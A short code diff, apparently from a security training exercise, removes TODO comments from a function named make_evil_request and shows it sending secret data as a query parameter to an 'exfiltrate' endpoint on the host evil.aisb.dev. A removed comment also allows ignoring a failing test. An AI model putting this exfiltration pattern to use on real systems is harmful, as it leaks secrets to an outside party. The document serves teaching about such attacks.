@@ -20,11 +20,6 @@ def make_evil_request(secret_data: str) -> Optional[str]:
     Returns:
         The response text from the server, or None if the request fails or throws
     """
-    # TODO: Implement the function to:
-    #   1. Make a GET request to http://evil.aisb.dev/exfiltrate?data=secret_data
-    #      - to ensure tests pass, use `requests.get(url, params=..., timeout=5)`
-    #      - if the tests fail and you are pretty sure you are making the correct request, you can ignore the first test
-    #   2. Return the response text if successful (status 200), None otherwise
     try:
         url = "http://evil.aisb.dev/exfiltrate"
         result = requests.get(url, params={"data": secret_data}, timeout=5)
